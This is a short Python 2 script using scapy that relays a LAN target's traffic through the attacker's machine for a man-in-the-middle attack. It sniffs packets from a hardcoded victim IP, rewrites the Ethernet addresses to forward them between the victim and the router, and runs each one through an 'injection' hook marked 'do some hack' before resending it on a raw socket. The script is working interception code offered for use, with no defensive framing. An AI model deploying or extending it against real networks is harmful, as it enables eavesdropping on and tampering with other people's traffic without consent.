from scapy.all import *
import socket


iface = 'enp0s31f6'

mymac = '8c:ec:4b:47:a0:a0'
myip = '192.168.28.85'

routermac = '50:64:2b:6a:35:79'
routerip = '192.168.28.1'

targetmac = '94:65:2d:e2:3b:f2'
targetip = '192.168.28.193'

bpf = "host %s and ether dst host %s"%(targetip, mymac)


def injection(x):
    print '\n----------'
    print repr(x)
    return x
# use a global raw socket to improve performance
sockraw = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
sockraw.bind((iface,0))

def process(x):
    global sockraw
    c = x.command()
    if x.name == 'Ethernet':
        if x.payload.name == "IP":
            # this is a ip package 
            if x.payload.dst != myip :
                if x.src == routermac:
                    x.dst = targetmac
                else:
                    x.dst = routermac
                x.src = mymac
                # now the ether part is ok

                x = injection(x)  # do some hack

                #print '\n-------------'
                #print hexdump(x)
                try:
                    sockraw.send(raw(x))
                except Exception,e:
                    print '\n-- err:'
                    print e
                    print '\n-- pkg:'
                    x.show()
                    exit()
    return 

def main():
    a = sniff(filter=bpf, prn = process)


if __name__ == "__main__":
    main()
